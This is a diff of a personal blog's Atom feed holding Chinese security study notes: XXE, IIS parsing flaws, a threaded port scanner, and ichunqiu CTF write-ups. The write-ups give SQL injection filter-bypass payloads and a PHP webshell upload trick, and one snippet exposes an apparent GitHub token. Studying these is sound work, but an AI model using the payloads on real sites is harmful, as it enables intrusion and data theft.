+&lt;p&gt;&lt;strong&gt;3.&lt;/strong&gt;端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>note-xxe漏洞浅析</title>
+    <link href="http://yoursite.com/2020/02/23/note-xxe%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
+    <id>http://yoursite.com/2020/02/23/note-xxe%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</id>
+    <published>2020-02-23T09:18:22.000Z</published>
+    <updated>2020-02-27T14:01:17.435Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="XEE漏洞"><a href="#XEE漏洞" class="headerlink" title="XEE漏洞"></a>XEE漏洞</h4><p>​    这两天看php://liter流的时候注意到，XXE的漏洞，细看之下，通过php流查看文件内容应该是属于这个漏洞的。</p><p>  XXE漏洞，即是<strong>XML外部实体注入。</strong></p><p>当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><p>要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。<strong>另外php版本大于5.4.45的默认不解析外部实体</strong>……</p><a id="more"></a><p>​    将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。</p><p>实际上读取服务器本地文件在web 题中很常见，构造xml代码，一旦有回显的情况，文件目录就几乎很容易看清，就算没有回显，也能通过类似于php流的方法进行写脚本以入侵；</p><p><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/177979.html</a></p><p><a href="https://blog.csdn.net/qq_40491569/article/details/83066200" target="_blank" rel="noopener">https://blog.csdn.net/qq_40491569/article/details/83066200</a></p><p><a href="https://skysec.top/2019/08/15/2019网络与信息安全领域专项赛Web%20Writeup/" target="_blank" rel="noopener">https://skysec.top/2019/08/15/2019网络与信息安全领域专项赛Web%20Writeup/</a></p><p>**<a href="https://skysec.top/2019/08/15/2019网络与信息安全领域专项赛Web%20Writeup/" target="_blank" rel="noopener">https://skysec.top/2019/08/15/2019网络与信息安全领域专项赛Web%20Writeup/</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;XEE漏洞&quot;&gt;&lt;a href=&quot;#XEE漏洞&quot; class=&quot;headerlink&quot; title=&quot;XEE漏洞&quot;&gt;&lt;/a&gt;XEE漏洞&lt;/h4&gt;&lt;p&gt;​    这两天看php://liter流的时候注意到，XXE的漏洞，细看之下，通过php流查看文件内容应该是属于这个漏洞的。&lt;/p&gt;
+&lt;p&gt;  XXE漏洞，即是&lt;strong&gt;XML外部实体注入。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。&lt;/p&gt;
+&lt;p&gt;要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。&lt;strong&gt;另外php版本大于5.4.45的默认不解析外部实体&lt;/strong&gt;……&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>note-文件包含漏洞php://fiter流浅析</title>
+    <link href="http://yoursite.com/2020/02/23/note-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9Ephp-fiter%E6%B5%81%E6%B5%85%E6%9E%90/"/>
+    <id>http://yoursite.com/2020/02/23/note-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9Ephp-fiter%E6%B5%81%E6%B5%85%E6%9E%90/</id>
+    <published>2020-02-23T08:39:58.000Z</published>
+    <updated>2020-02-23T08:39:58.254Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>2.23-html基础</title>
+    <link href="http://yoursite.com/2020/02/22/2-23-html%E5%9F%BA%E7%A1%80/"/>
+    <id>http://yoursite.com/2020/02/22/2-23-html%E5%9F%BA%E7%A1%80/</id>
+    <published>2020-02-22T09:43:05.000Z</published>
+    <updated>2020-02-22T10:26:45.440Z</updated>
+    
+    <content type="html"><![CDATA[<p>  想自己搭建一些网站环境，所以了解一点html</p><ul><li><html> 与 </html> 之间的文本描述网页</li><li><body> 与 </body> 之间的文本是可见的页面内容</li><li><h1> 与 </h1> 之间的文本被显示为标题</li><li><p> 与 </p> 之间的文本被显示为段落</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;  想自己搭建一些网站环境，所以了解一点html&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;html&gt; 与 &lt;/html&gt; 之间的文本描述网页&lt;/li&gt;
+&lt;li&gt;&lt;body&gt; 与 &lt;/body&gt; 之间的文本是可见的页面内容&lt;/li&gt;
+&lt;li&gt;&lt;h1&gt; 与 &lt;/h1&gt; 之间的文本被显示为标
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>2.22-kali -binwalk</title>
+    <link href="http://yoursite.com/2020/02/22/2-22-kali-binwalk/"/>
+    <id>http://yoursite.com/2020/02/22/2-22-kali-binwalk/</id>
+    <published>2020-02-22T08:12:58.000Z</published>
+    <updated>2020-02-22T08:24:38.655Z</updated>
+    
+    <content type="html"><![CDATA[<p>kali   自带图片隐写工具 steghide</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;kali   自带图片隐写工具 steghide&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>2.21-php://liter 协议</title>
+    <link href="http://yoursite.com/2020/02/21/2-21-php-liter-%E5%8D%8F%E8%AE%AE/"/>
+    <id>http://yoursite.com/2020/02/21/2-21-php-liter-%E5%8D%8F%E8%AE%AE/</id>
+    <published>2020-02-21T12:00:48.000Z</published>
+    <updated>2020-03-01T12:33:32.235Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/fuckcat_2333/article/details/52132559?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/fuckcat_2333/article/details/52132559?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/fuckcat_2333/article/details/52132559?depth_1-utm_source=distribute.pc_relevant.none-task&amp;amp;utm_source=d
+      
+    
+    </summary>
+    
+    
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+      <category term="文件包含" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2.20for april</title>
+    <link href="http://yoursite.com/2020/02/20/2-20for-april/"/>
+    <id>http://yoursite.com/2020/02/20/2-20for-april/</id>
+    <published>2020-02-20T05:34:54.000Z</published>
+    <updated>2020-02-23T14:21:17.115Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+    
+      <category term="interview" scheme="http://yoursite.com/tags/interview/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2.20渗透测试杂识</title>
+    <link href="http://yoursite.com/2020/02/20/2-20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%9D%82%E8%AF%86/"/>
+    <id>http://yoursite.com/2020/02/20/2-20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%9D%82%E8%AF%86/</id>
+    <published>2020-02-20T05:26:14.000Z</published>
+    <updated>2020-03-01T12:25:47.238Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.web容器：</p><p>  web容器是一种服务程序，在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求，如JAVA中的Tomcat容器，调试JSP </p><p>ASP的IIS或PWS都是这样的容器。一个服务器可以有多个容器。</p><p>Tomcat和IIS、Apache</p><p>2.IIS解析漏洞</p><p>  IIS6.0有2种解析漏洞</p><p>\1. 目录解析</p><p>以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。</p><p>\2. 文件解析</p><p>*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。</p><a id="more"></a>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;1.web容器：&lt;/p&gt;
+&lt;p&gt;  web容器是一种服务程序，在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求，如JAVA中的Tomcat容器，调试JSP &lt;/p&gt;
+&lt;p&gt;ASP的IIS或PWS都是这样的容器。一个服务器可以有多个容器。&lt;/p&gt;
+&lt;p&gt;Tomcat和IIS、Apache&lt;/p&gt;
+&lt;p&gt;2.IIS解析漏洞&lt;/p&gt;
+&lt;p&gt;  IIS6.0有2种解析漏洞&lt;/p&gt;
+&lt;p&gt;\1. 目录解析&lt;/p&gt;
+&lt;p&gt;以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。&lt;/p&gt;
+&lt;p&gt;\2. 文件解析&lt;/p&gt;
+&lt;p&gt;*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="note" scheme="http://yoursite.com/categories/note/"/>
+    
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali渗透实战</title>
+    <link href="http://yoursite.com/2020/02/20/kali%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
+    <id>http://yoursite.com/2020/02/20/kali%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</id>
+    <published>2020-02-20T05:25:45.000Z</published>
+    <updated>2020-02-20T05:25:45.409Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>简介</title>
+    <link href="http://yoursite.com/2020/02/18/%E7%AE%80%E4%BB%8B/"/>
+    <id>http://yoursite.com/2020/02/18/%E7%AE%80%E4%BB%8B/</id>
+    <published>2020-02-18T12:00:30.000Z</published>
+    <updated>2020-02-22T08:23:32.631Z</updated>
+    
+    <content type="html"><![CDATA[<p>  电脑崩溃东西全没了，只备份了html文件，吐血</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;  电脑崩溃东西全没了，只备份了html文件，吐血&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>python 多线程</title>
+    <link href="http://yoursite.com/2020/01/30/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
+    <id>http://yoursite.com/2020/01/30/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/</id>
+    <published>2020-01-30T13:20:47.000Z</published>
+    <updated>2020-02-27T14:01:28.709Z</updated>
+    
+    <content type="html"><![CDATA[<p>已经接触到python的网路编程，在代码实现端口扫描的时候遇到一个问题，</p><p>独立实现循环，然后connect到ip，实现很慢，而使用多线程调用连接函数，就可以在1s内从1-1024完成循环；</p><p>  不禁对python多线程到底如何实现起了兴趣，</p><p>要知道CPU运行极快，所以在我们眼中就很多任务都是并行，实际上是极快的一条一条处理，这里有点后悔没有好好钻研操作系统；</p><a id="more"></a><p>这些我们不关注，但python多线程是对于每一个任务进行合理的分配运行</p><p>就例如，循环调用一个函数，这个函数需要一定时间，并且这个时间不固定，不固定的时间用在等待上，就比如网络连接，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"><span class="keyword">from</span> threading import Thread</span><br><span class="line">def main(target):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span><span class="built_in"> port </span><span class="keyword">in</span> range(1,1024):</span><br><span class="line">        t = Thread(<span class="attribute">target</span>=portscan,args=(target,port))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">def portscan(target,port):</span><br><span class="line">   <span class="built_in"> client </span>= socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        client.connect((target, port))</span><br><span class="line"></span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"开放 [] %s:%d"</span> % (target, port))</span><br><span class="line">    except:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"no %d"</span> % (port))</span><br></pre></td></tr></table></figure><p>理论上多线程合理分配时间还需要加上分配的时间会更慢，巧在connect是需要等待的，所以python</p><p>这里需要了解下GIL：</p><p>　　Python是解释型语言，那么它在运行的时候就需要解释器了，简单描述下GIL，即global interpreter lock，全局解释器锁，就是python在运行的时候会锁定解释器，就是说在运行的时候只能是一个线程，锁死了，切换不了；每个线程在运行之前都要申请GIL，那么就必须要等上一个线程释放这把锁你才可以申请到，然后执行代码，执行完后，你再交给下一个线程，让它去执行代码，过程如下：</p><p>　　设置GIL -&gt; 切换到一个线程去执行 -&gt; 运行 -&gt; 把线程设置为睡眠状态 -&gt; 解锁GIL</p><p>　　然后再次重复以上步骤。<br>于是网络连接多线程会奇迹般的快，结果如输出如下，并不是按顺序输出：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">D:\py\test\venv\Scripts\python.exe</span> <span class="string">D:/py/test/portscan.py</span></span><br><span class="line"><span class="string">输入待扫描IP：127.0.0.1</span></span><br><span class="line"><span class="string">开放</span> <span class="string">[]</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:135</span></span><br><span class="line"><span class="literal">no</span> <span class="number">137</span></span><br><span class="line"><span class="string">开放</span> <span class="string">[]</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:443</span></span><br><span class="line"><span class="string">开放</span> <span class="string">[]</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:445</span></span><br><span class="line"><span class="string">开放</span> <span class="string">[]</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:902</span></span><br><span class="line"><span class="string">开放</span> <span class="string">[]</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:912</span></span><br><span class="line"><span class="literal">no</span> <span class="string">10no</span> <span class="string">12no</span> <span class="number">5</span></span><br><span class="line"><span class="literal">no</span> <span class="number">2</span></span><br><span class="line"><span class="literal">no</span> <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="literal">no</span> <span class="string">8no</span> <span class="string">13no</span> <span class="string">4no</span> <span class="string">1no</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="literal">no</span> <span class="number">30</span></span><br><span class="line"><span class="literal">no</span> <span class="number">28</span></span><br><span class="line"><span class="literal">no</span> <span class="string">35no</span> <span class="string">37no</span> <span class="string">27no</span> <span class="number">24</span></span><br><span class="line"><span class="literal">no</span> <span class="number">29</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">.</span></span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;已经接触到python的网路编程，在代码实现端口扫描的时候遇到一个问题，&lt;/p&gt;
+&lt;p&gt;独立实现循环，然后connect到ip，实现很慢，而使用多线程调用连接函数，就可以在1s内从1-1024完成循环；&lt;/p&gt;
+&lt;p&gt;  不禁对python多线程到底如何实现起了兴趣，&lt;/p&gt;
+&lt;p&gt;要知道CPU运行极快，所以在我们眼中就很多任务都是并行，实际上是极快的一条一条处理，这里有点后悔没有好好钻研操作系统；&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>sql注入</title>
+    <link href="http://yoursite.com/2020/01/30/sql%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2020/01/30/sql%E6%B3%A8%E5%85%A5/</id>
+    <published>2020-01-30T13:16:57.000Z</published>
+    <updated>2020-02-27T14:02:30.470Z</updated>
+    
+    <content type="html"><![CDATA[<p>=，select,union</p><p>ichunqiu的一道题，过滤的蛮基础的</p><p>  1.打开网页显示是一个数值注入点</p><p>1.29.1</p> <a id="more"></a><ol><li>尝试注入 id = 1 or 1 = 1#</li></ol><p>报错，应该是过滤了，尝试字符后发现是过滤等号</p><p>尝试了 like,rlike，!(&lt;&gt;),都不行，正则regexp可以</p><p>3.注入 id = 1 or 1 regexp 1#</p><p>1.29.2</p><p>4.找回显点，发现select和union都过滤，试了很多，发现&lt;&gt;可以绕过</p><p>构造payload：id = 1 un&lt;&gt;ion se&lt;&gt;lect 1,2,3#</p><p>1.29.4</p><ol><li>接下来就简单了</li></ol><p>库database();</p><p>表：id=1 un&lt;&gt;ion se&lt;&gt;lect 1,(sel&lt;&gt;ect group_concat(table_name) from information_schema.tables where table_schema regexp ‘sqli’ ),3#</p><p>字段：(sel&lt;&gt;ect group_concat(column_name) from information_schema.columns where table_schema regexp ‘sqli’ and table_name regexp ‘info’)</p><p>info过滤，用16进制代替0x696e666f；</p><p>1.29.6</p><p>6.最后出结果</p><p>(se&lt;&gt;lect group_concat(flAg_T5ZNdrm) from info)</p><p>奇怪的是最后一步又不过滤info，搞不懂</p><p>2.sqli这题就是上一题注出的另一个表users</p><p>这题找到注入页面就颇费了一番心思，重定向搞了人一手</p><p>而且发现可以注入</p><p>id = 1 ‘ and ’1/0 时，想着用字符盲注算了，结果ASCII怎么都不行</p><p>气死了，常规注入算了，</p><p>还非常奇怪的是，id= 1 如果注入失败会把URL里的过滤后的语言输出，降低了难度；</p><p>从上面知道逗号被过滤，然后学到可以用 </p><p>union select 1,2,3,4;<br>union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D);<br>union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),’ ‘,database(),’ ‘,@@datadir))D);</p><p>ok解决；id=-1’ union select * from (select group_concat(table_name)from information_schema.tables where table_schema = ‘sqli’) a join (select version()) b%23</p><p>l0gin.php?id=-1’ union select * from (select group_concat(column_name)from information_schema.columns where table_name = ‘users’) a join (select version()) b%23</p><p>两题同出一辙；</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;=，select,union&lt;/p&gt;
+&lt;p&gt;ichunqiu的一道题，过滤的蛮基础的&lt;/p&gt;
+&lt;p&gt;  1.打开网页显示是一个数值注入点&lt;/p&gt;
+&lt;p&gt;1.29.1&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>upload</title>
+    <link href="http://yoursite.com/2020/01/29/upload-ichunqiu/"/>
+    <id>http://yoursite.com/2020/01/29/upload-ichunqiu/</id>
+    <published>2020-01-29T13:14:15.000Z</published>
+    <updated>2020-02-27T14:02:36.487Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="http://f96a515a181e4c58b4c4ca051a5a96ccb616ba34919f4f34.changame.ichunqiu.com/" target="_blank" rel="noopener">http://f96a515a181e4c58b4c4ca051a5a96ccb616ba34919f4f34.changame.ichunqiu.com/</a>  + u/2.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">T</span>&gt;</span>MYSQL<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H</span>&gt;</span>localhost<span class="tag">&lt;/<span class="name">H</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">U</span>&gt;</span>root<span class="tag">&lt;/<span class="name">U</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span><span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">L</span>&gt;</span>utf8<span class="tag">&lt;/<span class="name">L</span>&gt;</span></span><br></pre></td></tr></table></figure><p>php菜刀</p> <a id="more"></a><p>过滤php</p><p>脚本一句话shell</p><p>​      </p><p>upload-2</p><p>涉及到文件类型限制和数据库操作</p><p>中国菜刀，</p><p>上传类型限制图片，用burpsuite repeater模块上传一句话php更改content-type为</p><p>image/jepg</p><p>2.1.1</p><p>连接后发现要登录数据里操作，配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">H</span>&gt;</span>localhost<span class="tag">&lt;/<span class="name">H</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;<span class="name">U</span>&gt;</span>ctf<span class="tag">&lt;/<span class="name">U</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span>ctfctfctf<span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也就是数据库的用户名和密码。ok</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;http://f96a515a181e4c58b4c4ca051a5a96ccb616ba34919f4f34.changame.ichunqiu.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://f96a515a181e4c58b4c4ca051a5a96ccb616ba34919f4f34.changame.ichunqiu.com/&lt;/a&gt;  + u/2.php&lt;/p&gt;
+&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;T&lt;/span&gt;&amp;gt;&lt;/span&gt;MYSQL&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;T&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;H&lt;/span&gt;&amp;gt;&lt;/span&gt;localhost&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;H&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;U&lt;/span&gt;&amp;gt;&lt;/span&gt;root&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;U&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;P&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;P&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;L&lt;/span&gt;&amp;gt;&lt;/span&gt;utf8&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;L&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt;php菜刀&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>宽字节注入</title>
+    <link href="http://yoursite.com/2020/01/20/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2020/01/20/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</id>
+    <published>2020-01-20T13:11:05.000Z</published>
+    <updated>2020-02-27T14:00:47.771Z</updated>
+    
+    <content type="html"><![CDATA[<p>宽字节注入</p><p>url gbk转，= -》%20,等</p><p>报错注入，</p><p>好复杂，没搞懂什么意思</p><p>是一个函数，没太懂，updatexml函数，具体再补充</p><p>= 过滤代替，like、！（&lt;&gt;），正则regexp</p> <a id="more"></a><p>括号过滤，</p><p>还有可以用burpsuite批量测试过滤语句</p><p>盲注</p><p>sleep()函数</p><p>select 语句 and sleep(),前为真执行sleep，前为假不执行</p><p>or sleep(),前真不执行，前查询为假执行</p><p>if(a,b,c),</p><p>a=1,return b</p><p>a=0,return c</p><p>if()结合 substr()，结合sleep()</p><p>substr(‘字符’，返回的第几个字符，返回字符长度)</p><p>subsring(‘’ ,2) or substing(‘’ from 1)</p><p><img src="https://s2.ax1x.com/2020/01/21/1kZWDS.png" alt="1kZWDS.png"></p><p>过滤逗号，subsring 可以用from 代替， </p><p>if 用 select case when</p><p>字符型盲注</p><p>截取函数，</p><p>mid</p><p>substr/subsring</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;宽字节注入&lt;/p&gt;
+&lt;p&gt;url gbk转，= -》%20,等&lt;/p&gt;
+&lt;p&gt;报错注入，&lt;/p&gt;
+&lt;p&gt;好复杂，没搞懂什么意思&lt;/p&gt;
+&lt;p&gt;是一个函数，没太懂，updatexml函数，具体再补充&lt;/p&gt;
+&lt;p&gt;= 过滤代替，like、！（&amp;lt;&amp;gt;），正则regexp&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>python-json-beautifulsoup</title>
+    <link href="http://yoursite.com/2020/01/17/python-json-beautifulsoup/"/>
+    <id>http://yoursite.com/2020/01/17/python-json-beautifulsoup/</id>
+    <published>2020-01-17T12:48:13.000Z</published>
+    <updated>2020-02-27T14:01:32.779Z</updated>
+    
+    <content type="html"><![CDATA[<p>dump序列</p><p>loads  逆过程</p><p>配合显示字典</p><p>requests 爬 github网站的code等</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#auther:loop</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> loop_json</span><br><span class="line"></span><br><span class="line">key = <span class="string">"baidu"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://api.github.com/search/code?q=%s"</span> % key</span><br><span class="line"></span><br><span class="line">TOKEN = <span class="string">'00e2b39028d493c56fc2737f7a9fa11011d02ef0'</span></span><br><span class="line">headers = &#123;<span class="string">"Authorization"</span>: <span class="string">"token %s"</span> % TOKEN&#125;</span><br><span class="line">params = &#123;<span class="string">"per_page"</span>: <span class="number">10</span>, <span class="string">"page"</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="comment"># = requests.get(url, headers=headers, params=params)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#d = r.json()</span></span><br><span class="line"></span><br><span class="line">loop_json.abc()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"test"</span></span><br></pre></td></tr></table></figure><p>Token是账户设置的一个值</p><p>key是查找内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 